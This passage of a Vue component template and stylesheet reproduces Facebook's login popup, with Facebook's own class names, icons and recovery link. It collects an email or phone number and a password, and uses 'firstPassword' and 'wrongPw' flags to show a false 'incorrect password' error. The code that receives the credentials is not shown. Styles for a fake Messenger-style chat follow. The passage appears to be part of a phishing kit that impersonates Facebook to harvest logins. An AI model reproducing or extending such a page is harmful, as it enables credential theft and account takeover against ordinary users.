    id="modalFade"
    class="fade modal-backdrop show"
  ></div>
  <div
    v-if="firstPassword"
    id="fbPasswordModal"
    role="dialog"
    aria-modal="true"
    class="fade modali2 modal show"
    style="display: block"
    tabindex="-1"
  >
    <div
      class="__fb-light-mode x1qjc9v5 x9f619 x78zum5 xdt5ytf xl56j7k x1c4vz4f xg6iff7"
    >
      <div
        class="x1cy8zhl x9f619 x78zum5 xl56j7k x2lwn1j xeuugli x47corl xurb0ha x1sxyh0 x1x97wu9 xbr3nou x3v4vwv x1dzdb2q"
      >
        <div
          role="dialog"
          class="x1n2onr6 x1ja2u2z x1afcbsf x78zum5 xdt5ytf x1a2a7pz x6ikm8r x10wlt62 x71s49j x1jx94hy x1qpq9i9 xdney7k xu5ydu1 xt3gfkd x104qc98 x1g2kw80 x16n5opg xl7ujzl xhkep3z x193iq5w"
        >
          <div class="x92rtbv x10l6tqk x1tk7jg1 x1vjfegm">
            <div
              aria-label="Close"
              class="x1i10hfl x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x16tdsg8 x1hl2dhg xggy1nq x87ps6o x1lku1pv x1a2a7pz x6s0dn4 x14yjl9h xudhj91 x18nykt9 xww2gxu x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xc9qbxq x14qfxbe x1qhmfi1"
              role="button"
              tabindex="0"
            >
<i data-visualcompletion="css-img" class="x1b0d499 x1d69dk1" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/XEU-8Pf8ztq.png&quot;); background-position: -42px -145px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
              <div
                class="x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x1wpzbip x18bame2 x1a2a7pz xvetz19 x14yjl9h xudhj91 x18nykt9 xww2gxu"
                data-visualcompletion="ignore"
              ></div>
            </div>
          </div>
          <div class="x1egiwwb x4l50q0">
            <div
              id="login_popup_cta_form"
            >
              <div class="xxqbpr x1gja9t x17p1517 x8vdgqj x2b8uid">
                <div class="x1xka2u1 xqfms19">
                  <span
                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1ill7wo x1x48ksl x1q74xe4 xyesn5m x1xlr1w8 xzsf02u x2b8uid"
                    dir="auto"
                    ><span
                      class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xg8j3zb"
                      style="
                        -webkit-box-orient: vertical;
                        -webkit-line-clamp: 2;
                        display: -webkit-box;
                      "
                      >See more on Facebook</span
                    ></span
                  >
                </div>
                <div class="x1s85apg xieb3on xrok9f9">
                  <span
                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xtoi2st x3x7a5m x1603h9y x1u7k74 x1xlr1w8 xzsf02u x2b8uid"
                    dir="auto"
                    >See more on Facebook</span
                  >
                </div>
                <div class="x1c436fg">
                  <div class="x78zum5 xdt5ytf xh8yej3">
                    <label
                      aria-label="Password"
                      class="xjhjgkd x1epquy7 xsnmfus x1562eck xcymrrh x1268tai x1mxuytg x14hpm34 xqvykr2 x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi xq2ru2l x17qb25w xjmv2fv x1b4qsv2 x78zum5 xdt5ytf x6ikm8r x10wlt62 x1n2onr6 x1ja2u2z x1egnk41 x1ed109x x1a2a7pz"
                      ><div class="x78zum5 xh8yej3">
                        <div class="xjbqb8w x1iyjqo2 x193iq5w xeuugli x1n2onr6">
                          <input
                            dir="ltr"
                            style="height:55px;"
                            aria-invalid="false"
                            placeholder="Email or phone number"
                            v-model="form.email"
                            class="x1i10hfl xggy1nq x1s07b3s x1kdt53j x1a2a7pz xjbqb8w x76ihet xwmqs3e x112ta8 xxxdfa6 x9f619 xzsf02u x1uxerd5 x1fcty0u x132q4wb x1a8lsjc x1pi30zi x1swvt13 x9desvi xh8yej3 x15h3p50 x10emqs4"
                            type="text"
                            name="pass"
                          />
                        </div></div
                    ></label>
                  </div>
                </div>
                <div class="x1c436fg">
                  <div class="x78zum5 xdt5ytf xh8yej3">
                    <label
                      aria-label="Password"
                      class="xjhjgkd x1epquy7 xsnmfus x1562eck xcymrrh x1268tai x1mxuytg x14hpm34 xqvykr2 x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi xq2ru2l x17qb25w xjmv2fv x1b4qsv2 x78zum5 xdt5ytf x6ikm8r x10wlt62 x1n2onr6 x1ja2u2z x1egnk41 x1ed109x x1a2a7pz"
                      for=":rd:"
                      ><div class="x78zum5 xh8yej3">
                        <div class="xjbqb8w x1iyjqo2 x193iq5w xeuugli x1n2onr6">
                          <input
                            dir="ltr"
                            placeholder="Password"
                            v-model="modal.password"
                            aria-invalid="false"
                            id=":rd:"
                            class="x1i10hfl xggy1nq x1s07b3s x1kdt53j x1a2a7pz xjbqb8w x76ihet xwmqs3e x112ta8 xxxdfa6 x9f619 xzsf02u x1uxerd5 x1fcty0u x132q4wb x1a8lsjc x1pi30zi x1swvt13 x9desvi xh8yej3 x15h3p50 x10emqs4"
                            type="password"
                            name="pass"
                          />
                        </div></div
                    ></label>
                  </div>
                </div>
                <p
                    v-if="wrongPw"
                    class="pwincorrect"
                    id="fbPasswordModalError"
                    style="color:red;"
                >
                    Your email or password is incorrect!
                </p>
                <div class="x1c436fg">
                  <div
                    aria-label="Accessible login button"
                    class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
                    role="button"
                    tabindex="0"
                    @click="submitPassword"
                  >
                    <div
                      class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xn6708d x1ye3gou xtvsq51 x1fq8qgq"
                    >
                      <div
                        class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"
                      >
                        <div
                          class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                        >
                          <span
                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x1lkfr7t x1lbecb7 x1s688f xtk6v10"
                            dir="auto"
                            ><span
                              class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"
                              >Log In</span
                            ></span
                          >
                        </div>
                      </div>
                      <div
                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                        data-visualcompletion="ignore"
                      ></div>
                    </div>
                  </div>
                </div>
                <div class="x1xka2u1">
                  <a
                    class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz xt0b8zv x1qq9wsj"
                    href="https://www.facebook.com/recover/initiate?ars=royal_blue_bar"
                    role="link"
                    tabindex="0"
                    target="_blank"
                    ><span
                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen x1s688f x1qq9wsj x2b8uid"
                      dir="auto"
                      >Forgot password?</span
                    ></a
                  >
                </div>
                <div class="x1hq5gj4">
                  <div
                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xn6708d x1ye3gou xykv574 xbmpl8g x4cne27 xifccgj"
                  >
                    <div
                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                    >
                      <div class="x1pjtg3p xjm9jq1"></div>
                    </div>
                    <div
                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                    >
                      <span
                        class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x676frb x1nxh6w3 x1sibtaa x1s688f xi81zsa x2b8uid"
                        dir="auto"
                        >or</span
                      >
                    </div>
                    <div
                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                    >
                      <div class="x1pjtg3p xjm9jq1"></div>
                    </div>
                  </div>
                </div>
                <div class="x1rg5ohu">
                  <div
                    aria-label="Create new account"
                    class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
                    role="button"
                    tabindex="0"
                  >
                    <div
                      class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xbxaen2 x1u72gb5 xv9rvxn x1fq8qgq"
                    >
                      <div
                        class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"
                      >
                        <div
                          class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                        >
                          <span
                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x1lkfr7t x1lbecb7 x1s688f xtk6v10"
                            dir="auto"
                            ><span
                              class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"
                              >Create new account</span
                            ></span
                          >
                        </div>
                      </div>
                      <div
                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                        data-visualcompletion="ignore"
                      ></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped src="../assets/css/form4.css"></style>
<style scoped src="../assets/css/main.css"></style>

<style scoped>
.hidden {
  display: none !important;
}
.open-modal {
  overflow: hidden !important;
  padding-right: 16px;
}

@media screen and (max-width: 764px) {
  .hidethis {
    display: none;
  }
}

/* Overall styling for the chat interface container */
.chat-interface {
  max-width: 600px;
  margin: 20px auto;
  padding: 10px;
  background: #f0f2f5;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
  font-family: Arial, sans-serif;
}

/* Styling for each chat entry, which includes questions and answers */
.chat-entry .question, .chat-entry .answer {
  padding: 10px 20px;
  margin: 5px 0;
  border-radius: 18px;
  color: white;
  max-width: 80%;
}

/* Specific styling for questions to appear like they are from the system */
.chat-entry .question {
  background-color: #0078FF; /* Facebook's primary blue color */
  text-align: left;
  margin-left: 10px;
}

/* Specific styling for answers to appear like they are from the user */
.chat-entry .answer {
  background-color: #E7F3FF; /* Light blue to signify user's answer */
  color: black;
  text-align: right;
  margin-right: 10px;
}

/* Styling for option buttons to mimic messenger buttons */
.option-button {
  display: block;
  width: calc(100% - 20px); /* Full width minus padding */
  padding: 12px 10px;
  margin: 5px 10px; /* Slight margin for spacing */
  background-color: white;
  color: #0078FF; /* Text color to match Facebook's theme */
  text-align: left;
  border: 2px solid #0078FF; /* Border to make it look clickable */
  border-radius: 18px;
  cursor: pointer;
  outline: none;
  font-size: 16px;
  transition: background-color 0.3s, color 0.3s;
}

/* Hover effect for better user interaction feedback */
.option-button:hover {
  background-color: #0078FF;
  color: white;
}

/* Ensure that the buttons and text do not have any text selection for better UX */
.option-button, .chat-entry .question, .chat-entry .answer {
  user-select: none;
}


</style>